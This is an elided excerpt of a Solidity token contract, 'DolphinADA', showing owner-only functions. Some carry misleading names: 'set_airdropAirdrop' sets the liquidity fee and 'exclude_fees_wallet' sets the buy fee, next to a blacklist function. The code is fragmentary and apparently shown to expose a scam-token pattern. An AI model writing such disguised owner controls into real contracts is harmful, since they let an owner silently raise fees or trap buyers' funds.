...
contract Dolphinada is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("DolphinADA", "DADA") public {
    ...
    function setMaxWalletLimit(uint256 value) external onlyOwner{
        ...
        function set_airdropAirdrop(uint256 value) external onlyOwner{
            liquidityFee = value;
        }
    ...
    function blacklistAddress(address account, bool value) external onlyOwner {
        ...
        function exclude_fees_wallet(uint256 value) external onlyOwner{
            buyFee = value;
        }
